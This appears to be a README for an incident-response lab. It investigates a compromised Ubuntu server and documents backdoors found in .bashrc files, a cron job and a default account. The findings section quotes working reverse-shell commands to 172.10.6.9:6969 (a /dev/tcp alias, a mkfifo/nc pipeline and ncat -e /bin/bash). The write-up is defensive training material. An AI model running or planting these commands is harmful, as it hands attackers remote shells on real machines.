# Incident Response Investigation – Compromised Linux Server (Multiple Backdoors)

This repository documents a hands-on Incident Response (IR) investigation involving a compromised Linux server that was isolated from production after multiple persistence mechanisms were discovered. The objective of this investigation was to identify, analyze, and remediate all backdoors before approving the system for safe reintroduction into the environment.

---

## Investigation Scenario

A Linux server was suspected of being compromised after anomalous behavior was detected. The Incident Response team isolated the host and confirmed the presence of **five separate backdoors**. The task was to perform a full investigation, identify all persistence mechanisms, document findings, and determine appropriate remediation steps.

Access was provided using privileged credentials:

- **Username:** giorgio  
- **Privileges:** Root access  
- **Access Method:** Local VM 

---
## Tools Used

The following tools and native Linux utilities were used throughout the incident response investigation to identify persistence mechanisms, analyze malicious activity, and validate compromise scope:

- **SSH** – Secure remote access to the isolated Linux virtual machine  
- **Bash Shell** – Interactive shell used for command execution and configuration analysis  
- **Cron** – Task scheduling subsystem analyzed for persistence mechanisms  
- **Netcat (nc / ncat)** – Identified as the attacker’s tool for reverse shell communication  
- **Core GNU/Linux Utilities** – Standard system tools leveraged during forensic analysis  
- **Local Virtual Machine Environment** – Safe, isolated environment for investigation and documentation  

All tools used reflect real-world utilities commonly available on Linux systems and mirror techniques used by both attackers and defenders.

---

## Utilities & Commands Referenced

The investigation relied on a minimal but realistic command set, reflecting a disciplined incident response approach focused on evidence preservation and signal over noise:

- `ssh` – Initial access to the compromised host  
- `ls -la` – Enumeration of hidden and suspicious files within user directories  
- `cat` – Review of configuration files such as `.bashrc` and `/etc/passwd`  
- `crontab -l` – Inspection of scheduled tasks for malicious persistence  
- `sudo su` – Privilege escalation to assess root-level persistence  
- `/etc/passwd` analysis – Identification of abused default system accounts  
- Shell redirection and piping (`|`, `>&`) – Observed within attacker payloads, not executed unnecessarily  

Each command and methodology is fully explained in the companion documentation located in:

📂 **Linux_Incident_Response_Notes**

This structure ensures the main investigation report remains concise, while detailed technical explanations are preserved for training, audit, and portfolio review purposes.

---
## Environment Details

- **Operating System:** Ubuntu 20.04.6 LTS
- **User Accounts Investigated:** giorgio, root, nobody
- 📄 **Operating System Discovery**  
  [Operating_System_Discovery.md](Linux-Incident-Response-Notes/Operating_System_Discovery.md)
 

  
<p align="center">
  <img src="https://i.imgur.com/Eu6VVQ8.png" width="80%" alt="March Logs"/>
</p>
---

## Investigation Workflow Overview

- Initial host access and OS identification  
- User home directory analysis  
- Shell configuration file review  
- Scheduled task (cron) inspection  
- Root account persistence analysis  
- System-wide persistence enumeration  
- Backdoor identification and documentation  

---

## Findings

### 1. User Account Investigation – giorgio

#### Suspicious File Discovery

**File Identified**
- **Filename:** `.bad_bash`  
- **Location:** `/home/giorgio/`
- 📄 **User Home Directory Enumeration**  
  [User_Home_Directory_Enumeration.md](Linux-Incident-Response-Notes/User_Home_Directory_Enumeration.md)



**Significance**  
The presence of a hidden file named `.bad_bash` in the user’s home directory is indicative of unauthorized modification. Hidden files with misleading names are commonly used by attackers to store malicious scripts or maintain persistence while avoiding casual detection.

<p align="center">
  <img src="https://i.imgur.com/0uLej3R.png" width="80%" alt="March Logs"/>
</p>
---

#### Malicious Bash Alias Persistence
- 📄 **Shell Configuration Review (.bashrc Abuse)**  
  [Shell_Configuration_Review.md](Linux-Incident-Response-Notes/Shell_Configuration_Review.md)


**Modified `.bashrc` Entry**  
A malicious alias was discovered within the user’s `.bashrc` file:

```bash
ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'

```
<p align="center">
  <img src="https://i.imgur.com/ewxbCBP.png" width="80%" alt="March Logs"/>
</p>

<p align="center">
  <img src="https://i.imgur.com/7bJXXFA.png" width="80%" alt="March Logs"/>
</p>


## 2. Scheduled Task Persistence (giorgio)
- 📄 **Scheduled Task (Cron) Persistence Investigation**  
  [Scheduled_Task_Investigation.md](Linux-Incident-Response-Notes/Scheduled_Task_Investigation.md)

A malicious cron-executed reverse shell was identified:

bash
/usr/bin/rm /tmp/f;
/usr/bin/mkfifo /tmp/f;
/usr/bin/cat /tmp/f | /bin/sh -i 2>&1 | /usr/bin/nc 172.10.6.9 6969 > /tmp/f
Persistence Mechanism: Scheduled task

C2 Address: 172.10.6.9:6969

Impact: Repeated outbound shell access

<p align="center">
  <img src="https://i.imgur.com/likslFb.png" width="80%" alt="March Logs"/>
</p>


## 3. Root Account Investigation
- 📄 **Root Account Persistence Analysis**  
  [Root_Account_Investigation.md](Linux-Incident-Response-Notes/Root_Account_Investigation.md)

Upon switching to the root account, an error message appeared automatically, indicating malicious execution without user interaction.

Observed Error Output

makefile
Copy code
Ncat: TIMEOUT.
Suspicious Command Executed

bash
Copy code
ncat -e /bin/bash 172.10.6.9 6969
Persistence Source

File: /root/.bashrc

Mechanism: Automatic execution of reverse shell on login

Privilege Level: Root (critical severity)

<p align="center">
  <img src="https://i.imgur.com/yHEeQNx.png" width="80%" alt="March Logs"/>
</p>

<p align="center">
  <img src="https://i.imgur.com/AZUBHpb.png" width="80%" alt="March Logs"/>
</p>


## 4. System-Level Persistence
- 📄 **System-Level Persistence via Default Accounts**  
  [System_Level_Persistence.md](Linux-Incident-Response-Notes/System_Level_Persistence.md)

A final persistence mechanism was identified tied to a default Linux account.

Account Name: nobody

Description: Abuse of a default system account commonly present in fresh Linux installs

Risk: Difficult-to-detect persistence leveraging trusted system users

<p align="center">
  <img src="https://i.imgur.com/FFeAT2g.png" width="80%" alt="March Logs"/>
</p>

## Indicators of Compromise (IOCs)
html
Copy code
<h3>Indicators of Compromise (IOCs)</h3>
<ul>
  <li><b>Compromised OS:</b> Ubuntu 20.04.6 LTS</li>
  <li><b>C2 IP Address:</b> 172.10.6.9</li>
  <li><b>C2 Port:</b> 6969</li>
  <li><b>Malicious File:</b> .bad_bash</li>
  <li><b>Compromised User:</b> giorgio</li>
  <li><b>Compromised User:</b> root</li>
  <li><b>Abused System Account:</b> nobody</li>
  <li><b>Persistence Mechanisms:</b> .bashrc modification, cron job, reverse shells</li>
  <li><b>Tools Used:</b> bash, nc, ncat</li>
</ul>

## MITRE ATT&CK Mapping
T1059.004 – Command and Scripting Interpreter: Bash
Malicious shell commands embedded in .bashrc files.

T1547.006 – Boot or Logon Autostart Execution: Bash Profile
Persistence via .bashrc execution on login.

T1053.003 – Scheduled Task / Job: Cron
Reverse shell persistence through scheduled tasks.

T1105 – Ingress Tool Transfer / Command and Control
Active reverse shell connections to attacker infrastructure.

T1078 – Valid Accounts
Abuse of legitimate user and system accounts for persistence.

## Final Assessment & Recommendations

The investigation conclusively identified a **multi-layered compromise** of the affected Linux server, involving persistence mechanisms at the user, root, and system-account levels. The adversary leveraged **advanced Linux techniques**, including modification of shell configuration files (`.bashrc`), deployment of **cron-based scheduled tasks**, and abuse of **default system accounts** to maintain unauthorized access. These actions demonstrate a high degree of familiarity with Linux system internals and standard administrative workflows, allowing the attacker to evade detection while establishing resilient persistence.

### Key Findings

- **User-Level Persistence:** Malicious `.bashrc` alias providing a reverse shell for the `giorgio` account.  
- **Scheduled Task Persistence:** Cron jobs enabling recurring reverse shell connections on the compromised user account.  
- **Root-Level Persistence:** Automatic execution of reverse shell commands via `/root/.bashrc`, providing privileged access.  
- **System-Level Persistence:** Abuse of the default `nobody` account to conceal malicious activity.  
- **C2 Infrastructure:** Outbound connections to IP `172.10.6.9` on port `6969` observed, indicating active command-and-control channels.  

### Recommendations

1. **System Rebuild:** Reimage the affected host from a known-good system image to ensure complete eradication of all persistence mechanisms.  
2. **Credential Rotation:** Reset all credentials associated with the server, including user and system accounts, and enforce strong password policies.  
3. **Configuration Audit:** Conduct a comprehensive audit of `.bashrc`, `.profile`, cron jobs, and other startup scripts across all critical systems to detect and remediate unauthorized modifications.  
4. **Network Controls:** Restrict outbound connections, monitor unusual ports, and block communications to known malicious IP addresses.  
5. **Monitoring Enhancements:** Deploy host-based intrusion detection (HIDS), file integrity monitoring (FIM), and SIEM correlation rules to detect recurring patterns of compromise.  
6. **Adjacent System Assessment:** Perform a full compromise assessment of network-connected hosts to identify lateral movement and additional infection points.  

### Lessons Learned

The investigation provides several key insights into both attacker behavior and improvements for future incident response readiness:

1. **User Awareness & Account Security**  
   - Compromises leveraged both legitimate and lookalike accounts (`giorgio`, `nobody`), emphasizing the need for strict account management, least-privilege enforcement, and monitoring for suspicious account activity.  
   - Regular review of user home directories and shell configuration files can detect malicious modifications before they escalate.

2. **Shell & Script Hardening**  
   - `.bashrc` and other shell startup files were abused to establish persistence. Implementing immutable configurations or restricted shell policies can reduce the attack surface for these techniques.  
   - Monitoring for unusual aliases or shell commands should be integrated into endpoint detection strategies.

3. **Scheduled Task Governance**  
   - Cron jobs were used to maintain recurring reverse shell access. Implementing centralized task management, auditing scheduled tasks, and alerting on unusual executions can help detect persistence early.

4. **Network Segmentation & Outbound Controls**  
   - Outbound connections to the attacker’s C2 server went unnoticed until active investigation. Strong egress filtering, network segmentation, and continuous monitoring of outbound traffic are critical to preventing exfiltration or C2 communication.  

5. **Proactive Monitoring & Detection**  
   - Host-based detection (HIDS), file integrity monitoring (FIM), and SIEM correlation rules would have flagged unusual system behavior sooner.  
   - Proactive alerts for modifications to sensitive files, execution of high-risk binaries (e.g., `ncat`, `nc`), or unusual cron jobs could reduce dwell time of attackers.

6. **Incident Response Preparedness**  
   - Having a structured IR workflow, isolated sandbox environments, and a “dirty wordlist” for persistence artifacts accelerated the investigation.  
   - Documenting every step, including commands used, timestamps, and affected accounts, is essential for both remediation and post-incident reporting.

**Summary:**  
This incident highlights the importance of **layered security controls**, **continuous monitoring**, and **structured IR processes** to prevent, detect, and respond to complex multi-layered compromises on Linux systems.


### Case Closure

All identified backdoors, artifacts, and Indicators of Compromise (IOCs) have been documented and preserved for SOC reporting, threat intelligence, and detection engineering purposes. Given the **depth of compromise** and **multiple persistence layers**, manual cleanup is insufficient. The affected host **remains unsafe for return to production** without a full system rebuild.

**Status:** Investigation complete – remediation requires system rebuild prior to production reinstatement.



